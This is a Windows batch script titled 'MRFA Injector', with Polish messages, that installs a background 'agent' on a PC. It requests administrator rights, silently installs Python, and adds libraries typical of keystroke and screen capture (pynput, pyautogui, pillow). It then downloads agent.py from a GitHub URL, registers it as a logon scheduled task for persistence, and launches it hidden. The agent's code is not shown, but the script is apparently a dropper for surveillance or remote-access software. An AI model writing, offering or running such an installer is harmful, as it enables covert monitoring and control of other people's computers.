@echo off
chcp 65001 >nul
title MRFA Injector
echo [MRFA] Instalacja agenta na komputerze...
echo [MRFA] Data: %DATE% %TIME%

net session >nul 2>&1
if %errorLevel% neq 0 (
    echo [MRFA] Brak uprawnien admina. Próba podniesienia...
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit
)

echo [MRFA] Uprawnienia admina OK.

python --version >nul 2>&1
if errorlevel 1 (
    echo [MRFA] Python nie znaleziony. Pobieranie i instalacja...
    curl -L -o python_installer.exe https://www.python.org/ftp/python/3.11.0/python-3.11.0-amd64.exe
    start /wait python_installer.exe /quiet InstallAllUsers=1 PrependPath=1
    del python_installer.exe
)

echo [MRFA] Instalacja bibliotek Python...
pip install --upgrade pip
pip install pynput pillow requests pyautogui psutil pygetwindow

echo [MRFA] Pobieranie agent.py...
curl -L -o %USERPROFILE%\agent.py https://raw.githubusercontent.com/mrfa-framework/mrfa/main/agent.py

echo [MRFA] Tworzenie zadania harmonogramu...
schtasks /create /tn "MRFA_Agent" /tr "python %USERPROFILE%\agent.py" /sc onlogon /f

echo [MRFA] Uruchamianie agenta...
start /B python %USERPROFILE%\agent.py

echo [MRFA] Instalacja zakonczona. Agent dziala.
pause
